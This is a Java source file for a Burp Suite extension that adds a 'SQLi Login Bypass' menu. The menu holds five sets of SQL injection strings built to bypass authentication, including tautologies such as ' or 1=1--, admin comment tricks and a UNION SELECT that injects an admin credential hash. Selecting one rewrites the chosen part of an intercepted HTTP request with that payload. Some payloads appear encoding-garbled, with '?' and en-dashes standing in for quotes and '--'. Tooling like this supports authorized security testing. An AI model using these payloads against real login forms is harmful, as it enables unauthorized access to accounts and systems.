/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package burp;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;

/**
 *
 * @author abdul.wahab
 */

public class SQli_LoginBypass extends JMenu {
    public BurpExtender myburp;
    public String[] Login_Menu = {"Set 1","Set 2","Set 3","Set 4","Set 5"};
    public String LoginMenuItems[][] = {
        {"' or ''='", "' or 1='1", "' or '1'='1", "' or ' 1=1", "' or 1=1--", "' or 1=1#", "' or 1=1/*", "') or '1'='1--", "') or ('1'='1--", "' or 1=1)#"},
        {"' or '1?='1", "' or 'x'='x", "' or 0=0 –", "or 0=0 –", "' or 0=0 #", "or 0=0 #", "') or ('x'='x", "' or 1=1–", "' or a=a–"},
        {"') or ('a'='a", "hi' or 1=1 –", "'or'1=1?", "'-'", "' '", "'&'", "'^'", "'*'", "' or ''-'", "' or '' '"},
        {"' or ''&'", "' or ''^'", "' or ''*'", "or true--", "' or true--", "') or ('x')=('x", "')) or (('x'))=(('x", "admin' --", "admin' #", "admin'/*"},
        {"admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*", "admin'or 1=1 or ''='", "admin') or ('1'='1", "admin') or ('1'='1'/*", "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"},
    };
    
    SQli_LoginBypass(BurpExtender burp){
        this.setText("SQLi Login Bypass");
        this.myburp = burp;
        Methods.Create_Main_Menu(this, Login_Menu, LoginMenuItems, new LoginBypassItemListener(myburp));
    }
}


class LoginBypassItemListener implements ActionListener {

    BurpExtender myburp;
    LoginBypassItemListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        int[] selectedIndex = myburp.context.getSelectionBounds();
        IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
        byte[] request = req.getRequest();
        byte[] param = new byte[selectedIndex[1]-selectedIndex[0]];
        System.arraycopy(request, selectedIndex[0], param, 0, selectedIndex[1]-selectedIndex[0]);
        String selectString = new String(param);
        String action = e.getActionCommand();
        byte[] newRequest = do_loginBypass(request, selectString, action, selectedIndex);
        req.setRequest(newRequest);
    }
    
    public byte[] do_loginBypass(byte[] request, String selectedString, String action, int[] selectedIndex){
        selectedString = action.replace(" ", "+");
        return Methods.do_modify_request(request, selectedIndex, selectedString);
    }
    

}